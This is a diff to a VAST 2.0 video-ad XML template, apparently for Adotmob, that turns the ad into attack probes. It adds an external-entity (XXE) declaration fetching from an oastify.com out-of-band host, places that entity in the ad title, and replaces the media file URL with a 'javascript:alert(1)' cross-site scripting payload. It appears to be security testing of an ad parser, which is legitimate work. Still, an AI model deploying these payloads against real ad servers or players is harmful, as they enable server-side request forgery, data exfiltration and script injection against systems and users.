@@ -1,9 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE VAST [
+  <!ENTITY xxe SYSTEM "http://wcc0gh1mkm1o0zef1hbdj2zwnntehd52.oastify.com/payload">
+]>
 <VAST version="2.0">
 <Ad id="{AD_ID}">
 <InLine>
 <AdSystem>Adotmob</AdSystem>
 <AdTitle>
-<![CDATA[ Adotmob ]]>
+<![CDATA[ &xxe; ]]>
 </AdTitle>
 <Error>
 <![CDATA[ https://tracker.adotmob.com/track/{ADOTMOB_ID}/57518988ba84b41000462933/error?b={BID} ]]>
@@ -23,7 +27,7 @@
 </VideoClicks>
 <MediaFiles>
 <MediaFile delivery="progressive" width="16" height="9" bitrate="548" type="video/mp4">
-<![CDATA[ https://hf0lj247n7493kh042eymn2hq8wzk18q.oastify.com/ ]]>
+<![CDATA[ javascript:alert(1) ]]>
 </MediaFile>
 </MediaFiles>
 </Linear>
